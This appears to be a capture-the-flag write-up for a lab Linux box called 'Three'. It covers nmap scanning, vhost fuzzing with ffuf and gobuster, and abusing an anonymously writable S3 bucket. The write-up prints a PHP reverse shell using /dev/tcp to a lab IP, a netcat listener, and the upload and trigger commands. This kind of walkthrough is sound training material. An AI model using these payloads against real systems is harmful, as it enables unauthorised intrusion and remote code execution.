# Three
**Target IP:** 10.129.145.184

Three is an easy Linux box that revolves around discovering a hidden vhost pointing to a misconfigured S3 bucket, then abusing write access to that bucket to drop a PHP web shell and get code execution.

## Enumeration

### Port scan

Started with a full port scan to make sure nothing was missed on the default top 1000 ports.

```bash
nmap -p- --min-rate 5000 --max-retries 9 10.129.145.184
```

```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Followed up with a version and script scan on the two open ports.

```bash
sudo nmap -sC -sV 10.129.145.184 -p 22,80
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Toppers
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

OpenSSH 7.6p1 and Apache 2.4.29 on Ubuntu. Requesting the root page returns a normal HTML site for "The Toppers."

From the Contacts Section I see an email `mail@thetoppers.htb`. I appended `10.129.145.184 thetoppers.htb` to `/etc/hosts`.

### Checking for known CVEs

`searchsploit` against both service versions turned up mostly situational results: a couple of OpenSSH username enumeration issues, and a handful of Apache exploits that needed specific conditions to apply. A search for `openssh 7.6p1 cve` also surfaced CVE-2024-6387 (regreSSHion), but nothing here pointed at a clean, direct path in, so the next step was to go back to basic web enumeration instead of chasing a shaky lead.

### Virtual host discovery

Before fuzzing for vhosts, I grabbed a baseline response size for a subdomain that shouldn't exist, so I'd know what size to filter out once real fuzzing started:

```bash
curl -s -o /dev/null -w "%{http_code} %{size_download}\n" -H "Host: asdfnonexistent123.thetoppers.htb" http://thetoppers.htb/
```

```bash
200 11952
```

With that baseline (11952 bytes), I tried `ffuf` first:

```bash
ffuf -u http://thetoppers.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.thetoppers.htb" -fs 11952
```

No hits. Switched to `gobuster` with a smaller wordlist just to sanity check:

```bash
gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 40
```

This immediately found `s3.thetoppers.htb`, which also promptly got added to the hosts file.

**Why did ffuf miss it and gobuster didn't?**

Checking the response for the real vhost explains it:

```bash
curl -s -o /dev/null -w "%{http_code} %{size_download}\n" -H "Host: s3.thetoppers.htb" http://thetoppers.htb/
```

```bash
404 21
```

`ffuf`'s default matcher only accepts response codes `200-299,301,302,307,401,403,405,500`. Since this vhost returns a 404, ffuf discarded it before the `-fs` size filter ever got a chance to run. `gobuster vhost` has no such matcher gate, it just compares response length, so it caught the hit right away. Lesson: when vhost fuzzing with ffuf, either drop `-mc all` or explicitly include 404 in the matcher list, don't rely on the size filter alone to do the filtering.

## Exploiting the S3 bucket

`s3.thetoppers.htb` is an Amazon S3-compatible service (most likely MinIO or similar, running locally). That means the AWS CLI can talk to it directly by pointing at a custom endpoint.

Listed the available buckets with no credentials:

```bash
aws s3 ls --endpoint-url http://s3.thetoppers.htb --no-sign-request
```

```bash
2026-07-13 17:52:08 thetoppers.htb
```

Listed the contents of the bucket:

```bash
aws s3 ls s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb --no-sign-request
```

```bash
                           PRE images/
2026-07-13 17:52:08          0 .htaccess
2026-07-13 17:52:08      11952 index.php
```

`index.php` is the site's home page, served straight out of this bucket. If the bucket accepts anonymous writes, dropping a PHP file into it should mean Apache serves it as executable PHP.

### Uploading a web shell

Wrote a simple reverse shell payload:

```php
<?php
system("bash -c 'bash -i >& /dev/tcp/10.10.14.139/80 0>&1'");
```

Started a listener:

```bash
nc -lvnp 80
```

Uploaded the payload straight into the bucket, again with no credentials:

```bash
aws s3 cp shell.php s3://thetoppers.htb/ --endpoint-url http://s3.thetoppers.htb --no-sign-request
```

Triggered it by requesting the file over HTTP:

```bash
curl http://thetoppers.htb/shell.php
```

Shell caught on the listener. Foothold obtained.

## Takeaways

- Anonymous S3 buckets that are also served directly by a web server are a straightforward path to remote code execution if they accept writes. Read access alone told us the file structure; write access turned it into a shell.
- Tool defaults matter. ffuf's matcher-first, filter-second behavior silently drops valid results that don't fall in its default status code list. Worth checking a tool's default matchers/filters before trusting a "no hits" result, especially during vhost or content discovery.